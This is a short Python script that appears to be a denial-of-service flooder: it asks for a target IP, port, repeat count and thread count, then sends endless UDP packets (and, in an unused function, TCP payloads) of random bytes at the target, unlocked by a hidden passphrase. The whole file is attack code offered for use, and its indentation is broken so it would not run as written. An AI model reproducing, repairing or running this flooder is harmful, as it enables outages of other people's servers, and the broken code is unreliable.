import random
import socket
import threading


print("""

   ▄████████ ███    █▄   ▄████████       ▄████████    ▄████████  ▄████████ 
  ███    ███ ███    ███ ███    ███      ███    ███   ███    ███ ███    ███ 
  ███    █▀  ███    ███ ███    █▀       ███    █▀    ███    ███ ███    █▀  
  ███        ███    ███ ███             ███          ███    ███ ███        
▀███████████ ███    ███ ███             ███        ▀███████████ ███        
         ███ ███    ███ ███    █▄       ███    █▄    ███    ███ ███    █▄  
   ▄█    ███ ███    ███ ███    ███      ███    ███   ███    ███ ███    ███ 
 ▄████████▀  ████████▀  ████████▀       ████████▀    ███    █▀  ████████▀  
                                                                          
  
""")
choice = str(input("Hello World !"))
ip= str(input(" Taget IP :"))
port= int(input(" Port :"))
times= int(input(" Times :"))
threads= int(input(" Threads :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			
    print("╔═════════════════")
    print(f"║ IP    : {ip}   ")
    print(f"║ Port  : {port} ")
    print(f"║ Times   : {times}")
    print(f"║ Threads : {threads} ")  
    print("╚═════════════════")
		except:
			 
    print("╔═════════════════")
    print(f"║ IP    : {ip}   ")
    print(f"║ Port  : {port} ")
    print(f"║ Times   : {times}")
    print(f"║ Threads : {threads} ")  
    print(f"║ Ngum Me Sever Roi ! ")  
    print("╚═════════════════")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			 
    
    print("╔═════════════════")
    print(f"║ IP    : {ip}   ")
    print(f"║ Port  : {port} ")
    print(f"║ Times   : {times}")
    print(f"║ Threads : {threads} ")  
    print("╚═════════════════")
		except:
			s.close()
			
    
    print("╔═════════════════")
    print(f"║ IP    : {ip}   ")
    print(f"║ Port  : {port} ")
    print(f"║ Times   : {times}")
    print(f"║ Threads : {threads} ")  
    print(f"║ Ngum Me Sever Roi ! ")  
    print("╚═════════════════")
            
for y in range(threads):
	if choice == 'z3n1tx':
		th = threading.Thread(target = run)
		th.start()
	else:
	print("╔═════════════════")
    print(f"║Hello World ! ")  
    print("╚═════════════════")
